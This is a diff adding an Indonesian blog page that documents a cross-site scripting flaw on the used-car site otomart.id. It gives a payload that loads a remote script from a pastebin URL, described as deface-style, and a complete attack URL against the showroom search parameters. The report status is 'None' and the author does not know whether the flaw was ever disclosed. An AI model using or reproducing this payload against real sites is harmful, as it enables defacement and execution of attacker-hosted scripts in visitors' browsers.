@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+<link rel="shortcut icon" href="https://i1.wp.com/abaykan.com/wp-content/uploads/2019/01/favicon.png">
+<meta name="description" content="OTOmart.id merupakan portal informasi mobil bekas terpercaya di Indonesia milik PT. Summit Auto Group."/>
+<meta property="og:title" content="XSS on Otomart.id" />
+<meta property="og:description" content="OTOmart.id merupakan portal informasi mobil bekas terpercaya di Indonesia milik PT. Summit Auto Group." />
+<meta property="og:url" content="" />
+<meta property="og:site_name" content="bug(ku)tulis" />
+<link href="https://fonts.googleapis.com/css?family=Arvo&display=swap" rel="stylesheet">
+<link rel="stylesheet" type="text/css" href="../css/awikwok.css">
+<head>
+	<title>XSS on Otomart.id</title>
+</head>
+<body>
+	<nav>
+     <a href="../index.htm">Home</a>
+     <a href="../index.htm#coretan">Coretan</a>
+     <a href="../tutorial.htm">Tutorial</a>
+     <a href="../tentang.htm">Tentang</a>
+    </nav>
+	<h1 align="center">XSS on Otomart.id</h1>
+	<h3>Published :</h3>
+	<ul>
+		<li>Time : 18 Juli 2019 22.00 WIB</li>
+        <li>By : Sinyo</li>
+        <li>Reported : None</li>
+	</ul>
+	<h3>Content :</h3>
+    <p>OTOmart.id merupakan portal informasi mobil bekas terpercaya di Indonesia milik PT. Summit Auto Group. Kami menyediakan berbagai kemudahan bagi Anda yang sedang mencari atau ingin menjual mobil bekas secara online.</p>
+    <color><p> Selebihnya bisa di baca di <a href="https://www.otomart.id/about/" target="_blank">SINI</a></p>
+    <h3>PoC : </h3>
+    <p>XSS on Pencarian Dealer dan Mobil :: <a href="https://www.otomart.id/showroom.htm">di sini</a></p>
+    <h3>Payload :</h3>
+    <p>Menggunakan custom html ala ala deface : </p>
+    <div class="border">
+        <pre>&quot;&gt;&lt;script src=&quot;https://pastebin.com/raw/mUBsAPXz&quot;&gt;&lt;/script&gt;</pre>
+    </div>
+    <h3>XSS Url :</h3>
+    <div class="border">
+        <pre>https://otomart.id/showroom.htm?province=aceh&amp;city=aceh-besar&amp;name=&quot;&gt;&lt;script src=&quot;https://pastebin.com/raw/mUBsAPXz&quot;&gt;&lt;/script&gt;</pre>
+    </div>
+    <h3>Screenshot :</h3>
+    <a href="../img/otomart/xss.png"><img src="../img/otomart/xss.png" alt=""></a>
+    <h3>Coretan : </h3>
+    <p>Ga tau udah di report apa belom, yang penting ada dokumentasi h3h3.</p>
+</body>
+</html>
